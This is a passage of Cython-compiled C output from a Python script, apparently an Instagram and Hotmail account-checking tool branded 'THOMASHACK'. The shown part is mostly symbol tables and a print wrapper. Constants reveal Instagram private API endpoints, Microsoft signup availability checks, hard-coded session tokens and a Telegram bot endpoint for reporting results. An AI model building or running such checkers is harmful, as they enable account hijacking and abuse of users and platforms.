static PyObject *__pyx_kp_u_T5OMAS_THOMASHACK_2;
static PyObject *__pyx_n_u_THOMAS;
static PyObject *__pyx_kp_u_Tek_Gercek_Thomas;
static PyObject *__pyx_kp_u_Telegram_T5OMAS;
static PyObject *__pyx_n_s_Text;
static PyObject *__pyx_n_s_Thread;
static PyObject *__pyx_n_s_ThreadPoolExecutor;
static PyObject *__pyx_n_s_U;
static PyObject *__pyx_kp_u_User_Agent;
static PyObject *__pyx_n_s_V;
static PyObject *__pyx_kp_u_VWlP20OW8k_xH6tFupQw1HwrEFETf_tD;
static PyObject *__pyx_n_s_ValueError;
static PyObject *__pyx_kp_u_Viewport_Width;
static PyObject *__pyx_n_u_WIFI;
static PyObject *__pyx_kp_u_Windows;
static PyObject *__pyx_n_s_X;
static PyObject *__pyx_n_u_XMLHttpRequest;
static PyObject *__pyx_kp_u_X_Asbd_Id;
static PyObject *__pyx_kp_u_X_Bloks_Version_Id;
static PyObject *__pyx_kp_u_X_Csrftoken;
static PyObject *__pyx_kp_u_X_FB_HTTP_Engine;
static PyObject *__pyx_kp_u_X_IG_App_ID;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_Speed_KBPS;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalBytes_B;
static PyObject *__pyx_kp_u_X_IG_Bandwidth_TotalTime_MS;
static PyObject *__pyx_kp_u_X_IG_Capabilities;
static PyObject *__pyx_kp_u_X_IG_Connection_Speed;
static PyObject *__pyx_kp_u_X_IG_Connection_Type;
static PyObject *__pyx_kp_u_X_IG_VP9_Capable;
static PyObject *__pyx_kp_u_X_Ig_App_Id;
static PyObject *__pyx_kp_u_X_Ig_Www_Claim;
static PyObject *__pyx_kp_u_X_Instagram_Ajax;
static PyObject *__pyx_kp_u_X_Pigeon_Rawclienttime;
static PyObject *__pyx_kp_u_X_Pigeon_Session_Id;
static PyObject *__pyx_kp_u_X_Requested_With;
static PyObject *__pyx_n_s_Y;
static PyObject *__pyx_n_s_YU;
static PyObject *__pyx_n_s_Z;
static PyObject *__pyx_n_s_Z1;
static PyObject *__pyx_kp_u__10;
static PyObject *__pyx_kp_u__12;
static PyObject *__pyx_kp_u__13;
static PyObject *__pyx_kp_u__14;
static PyObject *__pyx_kp_u__15;
static PyObject *__pyx_kp_u__16;
static PyObject *__pyx_kp_u__17;
static PyObject *__pyx_kp_u__18;
static PyObject *__pyx_kp_u__19;
static PyObject *__pyx_kp_u__20;
static PyObject *__pyx_kp_u__21;
static PyObject *__pyx_kp_u__22;
static PyObject *__pyx_kp_u__23;
static PyObject *__pyx_kp_u__24;
static PyObject *__pyx_kp_u__25;
static PyObject *__pyx_kp_u__27;
static PyObject *__pyx_kp_u__3;
static PyObject *__pyx_kp_u__33;
static PyObject *__pyx_kp_u__4;
static PyObject *__pyx_n_u__48;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_kp_u__6;
static PyObject *__pyx_kp_u__7;
static PyObject *__pyx_kp_u__8;
static PyObject *__pyx_kp_u__9;
static PyObject *__pyx_n_s_a;
static PyObject *__pyx_n_u_a;
static PyObject *__pyx_n_u_accept;
static PyObject *__pyx_kp_u_accept_language;
static PyObject *__pyx_n_s_ada;
static PyObject *__pyx_n_u_ai_session;
static PyObject *__pyx_n_s_align;
static PyObject *__pyx_n_s_amsc;
static PyObject *__pyx_n_u_amsc;
static PyObject *__pyx_n_s_ana_menu;
static PyObject *__pyx_n_s_append;
static PyObject *__pyx_kp_u_application_json;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode;
static PyObject *__pyx_kp_u_application_x_www_form_urlencode_2;
static PyObject *__pyx_kp_u_ar_AE_ar_q_0_9_en_US_q_0_8_en_q;
static PyObject *__pyx_kp_u_ar_AR;
static PyObject *__pyx_kp_u_ar_IQ_en_US;
static PyObject *__pyx_kp_u_ar_YE;
static PyObject *__pyx_kp_u_ar_YE_ar_q_0_9_en_YE_q_0_8_en_US;
static PyObject *__pyx_n_u_authority;
static PyObject *__pyx_n_s_b;
static PyObject *__pyx_n_s_badhot;
static PyObject *__pyx_n_s_badighot;
static PyObject *__pyx_n_s_badigout;
static PyObject *__pyx_n_s_badinsta;
static PyObject *__pyx_n_s_badmain;
static PyObject *__pyx_n_s_badout;
static PyObject *__pyx_n_s_bio;
static PyObject *__pyx_n_u_biography;
static PyObject *__pyx_n_s_blo;
static PyObject *__pyx_n_s_blodk;
static PyObject *__pyx_n_u_blue;
static PyObject *__pyx_n_s_brt;
static PyObject *__pyx_n_s_canary;
static PyObject *__pyx_n_u_canary;
static PyObject *__pyx_n_u_center;
static PyObject *__pyx_n_s_cfonts;
static PyObject *__pyx_n_s_chk;
static PyObject *__pyx_n_s_chkfile;
static PyObject *__pyx_n_s_choice;
static PyObject *__pyx_n_u_clear;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_u_clrc;
static PyObject *__pyx_n_u_cls;
static PyObject *__pyx_n_s_cok;
static PyObject *__pyx_n_s_colorama;
static PyObject *__pyx_n_s_colors;
static PyObject *__pyx_n_s_com;
static PyObject *__pyx_n_s_com_A;
static PyObject *__pyx_n_s_com_blo;
static PyObject *__pyx_n_s_com_blodk;
static PyObject *__pyx_n_s_com_brt;
static PyObject *__pyx_n_s_com_grn;
static PyObject *__pyx_n_s_com_orde;
static PyObject *__pyx_n_s_com_red;
static PyObject *__pyx_n_s_com_yalo;
static PyObject *__pyx_n_s_concurrent;
static PyObject *__pyx_n_s_concurrent_futures;
static PyObject *__pyx_n_s_console;
static PyObject *__pyx_kp_u_content_type;
static PyObject *__pyx_n_s_cookies;
static PyObject *__pyx_n_u_cors;
static PyObject *__pyx_n_u_count;
static PyObject *__pyx_n_s_csrftoken;
static PyObject *__pyx_n_u_dark;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_u_data;
static PyObject *__pyx_n_u_date;
static PyObject *__pyx_n_s_datet;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_decode;
static PyObject *__pyx_n_u_dnt;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_u_doc_id;
static PyObject *__pyx_n_s_dom;
static PyObject *__pyx_n_s_domin;
static PyObject *__pyx_n_s_dosyasil;
static PyObject *__pyx_n_u_dpr;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_u_edge_follow;
static PyObject *__pyx_n_u_edge_followed_by;
static PyObject *__pyx_kp_u_ef02f559b04e8d7cbe15fb8cf18e2b48;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_u_email;
static PyObject *__pyx_kp_u_email_2;
static PyObject *__pyx_n_u_email_is_taken;
static PyObject *__pyx_n_u_empty;
static PyObject *__pyx_kp_u_en_US_en_q_0_9;
static PyObject *__pyx_kp_u_en_US_en_q_0_9_ar_q_0_8;
static PyObject *__pyx_n_s_encode;
static PyObject *__pyx_n_s_encoded;
static PyObject *__pyx_n_s_end;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_error;
static PyObject *__pyx_n_s_executor;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_n_s_faker;
static PyObject *__pyx_n_u_false;
static PyObject *__pyx_n_u_fb_api_caller_class;
static PyObject *__pyx_n_u_fb_api_req_friendly_name;
static PyObject *__pyx_n_s_filename;
static PyObject *__pyx_n_s_fj;
static PyObject *__pyx_n_s_fol;
static PyObject *__pyx_n_s_fols;
static PyObject *__pyx_n_s_format;
static PyObject *__pyx_n_u_full_name;
static PyObject *__pyx_n_s_generate_user_agent;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_get_dict;
static PyObject *__pyx_n_s_get_id;
static PyObject *__pyx_n_s_get_username;
static PyObject *__pyx_n_s_getcnre;
static PyObject *__pyx_n_s_gm1;
static PyObject *__pyx_n_s_gm2;
static PyObject *__pyx_n_s_goodhotandout;
static PyObject *__pyx_kp_u_green_yellow;
static PyObject *__pyx_n_s_grn;
static PyObject *__pyx_kp_u_gzip_deflate;
static PyObject *__pyx_kp_u_gzip_deflate_br;
static PyObject *__pyx_n_s_haha;
static PyObject *__pyx_n_s_hashlib;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_heedrs;
static PyObject *__pyx_n_s_hexdigest;
static PyObject *__pyx_kp_u_hmac_AR11z00N_IbRNGrzU_J3F40kHM4;
static PyObject *__pyx_kp_u_hmac_AR2f295htsHXPFyt6RxGipeoIQH;
static PyObject *__pyx_kp_u_hotmail_com;
static PyObject *__pyx_n_u_hpgid;
static PyObject *__pyx_kp_u_https_api_telegram_org_bot;
static PyObject *__pyx_kp_u_https_api_telegram_org_bot696846;
static PyObject *__pyx_kp_u_https_i_instagram_com_api_v1_acc;
static PyObject *__pyx_kp_u_https_o7aa_pythonanywhere_com_id;
static PyObject *__pyx_kp_u_https_signup_live_com;
static PyObject *__pyx_kp_u_https_signup_live_com_API_CheckA;
static PyObject *__pyx_kp_u_https_signup_live_com_signup_mkt;
static PyObject *__pyx_kp_u_https_t_me_thomashack;
static PyObject *__pyx_kp_u_https_www_instagram_com;
static PyObject *__pyx_kp_u_https_www_instagram_com_5u2_a;
static PyObject *__pyx_kp_u_https_www_instagram_com_api_v1_u;
static PyObject *__pyx_kp_u_https_www_instagram_com_api_v1_w;
static PyObject *__pyx_kp_u_https_www_instagram_com_graphql;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_kp_u_i_instagram_com;
static PyObject *__pyx_n_s_id;
static PyObject *__pyx_n_u_id;
static PyObject *__pyx_n_s_ids;
static PyObject *__pyx_n_s_idtle;
static PyObject *__pyx_n_u_ig_sig_key_version;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_u_includeSuggestions;
static PyObject *__pyx_n_s_infoprint;
static PyObject *__pyx_n_s_infosand;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_ins1;
static PyObject *__pyx_n_s_ins2;
static PyObject *__pyx_kp_u_ip;
static PyObject *__pyx_kp_u_isAvailable_true;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_kp_u_keep_alive;
static PyObject *__pyx_n_u_lic;
static PyObject *__pyx_n_s_lines;
static PyObject *__pyx_n_s_loob;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_u_main;
static PyObject *__pyx_n_s_max_workers;
static PyObject *__pyx_n_s_md5;
static PyObject *__pyx_n_s_mechanize;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_kp_u_mid_ZHTlnQALAAFHZAE8G64BeLHXNMv6;
static PyObject *__pyx_kp_u_mid_Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ;
static PyObject *__pyx_n_u_mkt;
static PyObject *__pyx_n_u_mkt1;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_n_s_nambrline;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_n_s_namefile;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_u_nt;
static PyObject *__pyx_n_s_o;
static PyObject *__pyx_n_s_okhot;
static PyObject *__pyx_n_s_okout;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_orde;
static PyObject *__pyx_n_u_origin;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_kp_u_outlook_com;
static PyObject *__pyx_n_s_output;
static PyObject *__pyx_n_s_p;
static PyObject *__pyx_n_s_params;
static PyObject *__pyx_kp_u_pip_install_AegosPy;
static PyObject *__pyx_kp_u_pip_install_Faker;
static PyObject *__pyx_kp_u_pip_install_GetInfoInsta;
static PyObject *__pyx_kp_u_pip_install_colorama;
static PyObject *__pyx_kp_u_pip_install_faker;
static PyObject *__pyx_kp_u_pip_install_json;
static PyObject *__pyx_kp_u_pip_install_mechanize;
static PyObject *__pyx_kp_u_pip_install_prettytable;
static PyObject *__pyx_kp_u_pip_install_python_cfonts;
static PyObject *__pyx_kp_u_pip_install_requests;
static PyObject *__pyx_kp_u_pip_install_threading;
static PyObject *__pyx_kp_u_pip_install_user_agent;
static PyObject *__pyx_kp_u_pip_install_uuid;
static PyObject *__pyx_kp_u_pip_install_webbrowser;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_prettytable;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_kp_u_r;
static PyObject *__pyx_n_s_r_2;
static PyObject *__pyx_n_s_random;
static PyObject *__pyx_n_s_randrange;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_re;
static PyObject *__pyx_n_s_readlines;
static PyObject *__pyx_n_s_red;
static PyObject *__pyx_n_u_referer;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_render;
static PyObject *__pyx_n_s_req;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_n_s_rest;
static PyObject *__pyx_n_s_rich;
static PyObject *__pyx_n_s_rich_console;
static PyObject *__pyx_n_s_rich_panel;
static PyObject *__pyx_n_s_rich_text;
static PyObject *__pyx_n_s_rr;
static PyObject *__pyx_n_s_rule;
static PyObject *__pyx_n_s_s;
static PyObject *__pyx_kp_u_same_origin;
static PyObject *__pyx_n_u_scid;
static PyObject *__pyx_kp_u_sec_ch_ua;
static PyObject *__pyx_kp_u_sec_ch_ua_mobile;
static PyObject *__pyx_kp_u_sec_ch_ua_platform;
static PyObject *__pyx_kp_u_sec_fetch_dest;
static PyObject *__pyx_kp_u_sec_fetch_mode;
static PyObject *__pyx_kp_u_sec_fetch_site;
static PyObject *__pyx_n_s_secim;
static PyObject *__pyx_n_s_secrets;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_kp_u_sendMessage_chat_id;
static PyObject *__pyx_n_u_server_timestamps;
static PyObject *__pyx_n_s_sg;
static PyObject *__pyx_n_u_signInName;
static PyObject *__pyx_n_u_signed_body;
static PyObject *__pyx_kp_u_signup_live_com;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_u_spin_b;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_kp_u_status;
static PyObject *__pyx_n_s_strip;
static PyObject *__pyx_n_s_submit;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_t;
static PyObject *__pyx_n_s_target;
static PyObject *__pyx_n_u_tcxt;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_text;
static PyObject *__pyx_kp_u_text_2;
static PyObject *__pyx_kp_u_thomas_txt;
static PyObject *__pyx_n_s_threading;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_token;
static PyObject *__pyx_n_s_token_hex;
static PyObject *__pyx_n_s_tokenbot;
static PyObject *__pyx_n_u_true;
static PyObject *__pyx_n_u_trunk;
static PyObject *__pyx_n_s_u;
static PyObject *__pyx_n_u_uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ;
static PyObject *__pyx_n_u_uaid;
static PyObject *__pyx_n_u_uiflvr;
static PyObject *__pyx_kp_u_unicode_escape;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_n_s_use;
static PyObject *__pyx_n_s_user;
static PyObject *__pyx_n_u_user;
static PyObject *__pyx_kp_u_userID;
static PyObject *__pyx_kp_u_user_agent;
static PyObject *__pyx_n_s_user_agent_2;
static PyObject *__pyx_n_s_user_file;
static PyObject *__pyx_n_s_username;
static PyObject *__pyx_n_u_username;
static PyObject *__pyx_kp_u_username_0s9s;
static PyObject *__pyx_n_s_uuid;
static PyObject *__pyx_n_s_uuid4;
static PyObject *__pyx_n_u_variables;
static PyObject *__pyx_n_s_w;
static PyObject *__pyx_n_s_webbrowser;
static PyObject *__pyx_n_u_white;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_kp_u_www_instagram_com;
static PyObject *__pyx_n_s_x;
static PyObject *__pyx_kp_u_x_csrftoken;
static PyObject *__pyx_kp_u_x_ms_apitransport;
static PyObject *__pyx_kp_u_x_ms_apiversion;
static PyObject *__pyx_n_u_xhr;
static PyObject *__pyx_n_s_y;
static PyObject *__pyx_n_s_yalo;
static PyObject *__pyx_kp_u_yellow_green_T5OMAS_THOMASHACK;
static PyObject *__pyx_kp_u_yellow_green_green_yellow;
static PyObject *__pyx_kp_u_yellow_green_green_yellow_2;
static PyObject *__pyx_kp_u_yellow_green_green_yellow_3;
static PyObject *__pyx_kp_u_yellow_green_green_yellow_4;
static PyObject *__pyx_kp_u_yellow_green_green_yellow_5;
static PyObject *__pyx_kp_u_yellow_green_green_yellow_6;
static PyObject *__pyx_n_s_z;
static PyObject *__pyx_pf_6source_sg(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_a, PyObject *__pyx_v_b); /* proto */
static PyObject *__pyx_pf_6source_3com_red(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_2grn(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_4yalo(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_6blo(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_8orde(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_10blodk(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_12A(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_3com_14brt(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_5Sajad___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_5Sajad_2chkfile(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_5Sajad_4tokenbot(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_5Sajad_6chk(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_use); /* proto */
static PyObject *__pyx_pf_6source_5Sajad_8idtle(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_5Sajad_10getcnre(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_2dosyasil(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_4get_id(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_6get_username(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_8dosyasil(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_10ana_menu(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_8;
static PyObject *__pyx_int_50;
static PyObject *__pyx_int_60;
static PyObject *__pyx_int_1001;
static PyObject *__pyx_int_100118;
static PyObject *__pyx_int_200639;
static PyObject *__pyx_int_1000000;
static PyObject *__pyx_int_40975110;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__26;
static PyObject *__pyx_tuple__28;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__30;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__34;
static PyObject *__pyx_tuple__35;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_tuple__37;
static PyObject *__pyx_tuple__38;
static PyObject *__pyx_tuple__39;
static PyObject *__pyx_tuple__40;
static PyObject *__pyx_tuple__41;
static PyObject *__pyx_tuple__42;
static PyObject *__pyx_tuple__43;
static PyObject *__pyx_tuple__44;
static PyObject *__pyx_tuple__45;
static PyObject *__pyx_tuple__46;
static PyObject *__pyx_tuple__47;
static PyObject *__pyx_tuple__49;
static PyObject *__pyx_tuple__50;
static PyObject *__pyx_tuple__51;
static PyObject *__pyx_tuple__52;
static PyObject *__pyx_tuple__53;
static PyObject *__pyx_tuple__54;
static PyObject *__pyx_tuple__55;
static PyObject *__pyx_tuple__56;
static PyObject *__pyx_tuple__57;
static PyObject *__pyx_tuple__58;
static PyObject *__pyx_tuple__68;
static PyObject *__pyx_tuple__70;
static PyObject *__pyx_tuple__72;
static PyObject *__pyx_tuple__74;
static PyObject *__pyx_tuple__76;
static PyObject *__pyx_tuple__78;
static PyObject *__pyx_tuple__81;
static PyObject *__pyx_tuple__83;
static PyObject *__pyx_tuple__86;
static PyObject *__pyx_codeobj__59;
static PyObject *__pyx_codeobj__60;
static PyObject *__pyx_codeobj__61;
static PyObject *__pyx_codeobj__62;
static PyObject *__pyx_codeobj__63;
static PyObject *__pyx_codeobj__64;
static PyObject *__pyx_codeobj__65;
static PyObject *__pyx_codeobj__66;
static PyObject *__pyx_codeobj__67;
static PyObject *__pyx_codeobj__69;
static PyObject *__pyx_codeobj__71;
static PyObject *__pyx_codeobj__73;
static PyObject *__pyx_codeobj__75;
static PyObject *__pyx_codeobj__77;
static PyObject *__pyx_codeobj__79;
static PyObject *__pyx_codeobj__80;
static PyObject *__pyx_codeobj__82;
static PyObject *__pyx_codeobj__84;
static PyObject *__pyx_codeobj__85;
static PyObject *__pyx_codeobj__87;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1sg(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_1sg = {"sg", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_1sg, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_1sg(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_a = 0;
  PyObject *__pyx_v_b = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("sg (wrapper)", 0);
  if (unlikely(__pyx_kwds) && unlikely(!__Pyx_CheckKeywordStrings(__pyx_kwds, "sg", 1))) return NULL;
  __pyx_v_b = (__pyx_kwds) ? PyDict_Copy(__pyx_kwds) : PyDict_New(); if (unlikely(!__pyx_v_b)) return NULL;
  __Pyx_GOTREF(__pyx_v_b);
  __Pyx_INCREF(__pyx_args);
  __pyx_v_a = __pyx_args;
  __pyx_r = __pyx_pf_6source_sg(__pyx_self, __pyx_v_a, __pyx_v_b);

  /* function exit code */
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v_b);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_sg(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_a, PyObject *__pyx_v_b) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("sg", 0);

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Lock); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 357, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 357, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 357, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 357, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 357, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        /*try:*/ {

          
          __pyx_t_1 = PyDict_Copy(__pyx_v_b); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 358, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_v_a, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 358, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source.sg", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_3) < 0) __PYX_ERR(0, 357, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_5 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_1, __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 357, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_5, NULL);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 357, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_10 = __Pyx_PyObject_IsTrue(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (__pyx_t_10 < 0) __PYX_ERR(0, 357, __pyx_L9_except_error)
          __pyx_t_11 = ((!(__pyx_t_10 != 0)) != 0);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_3);
            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_1, __pyx_t_3);
            __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_3 = 0; 
            __PYX_ERR(0, 357, __pyx_L9_except_error)
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
